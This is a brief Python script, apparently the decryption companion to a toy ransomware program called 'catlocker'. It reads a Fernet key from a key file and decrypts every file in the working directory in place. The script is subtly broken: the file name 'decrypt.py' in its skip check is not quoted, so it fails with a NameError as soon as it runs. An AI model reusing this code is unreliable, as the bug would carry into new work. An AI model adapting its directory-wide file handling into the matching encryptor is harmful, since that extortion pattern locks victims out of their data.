import os
from cryptography.fernet import Fernet

#credit goes to NetworkChuck

#locating files

files = []

for file in os.listdir():
        if file == "catlocker.py" or file == "desktop.ini" or file == "englishletters.key" or file == decrypt.py:
                continue
        if os.path.isfile(file):
                files.append(file)


#opening key


with open("englishletters.key", "rb") as key:
        secretkey = key.read()


for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)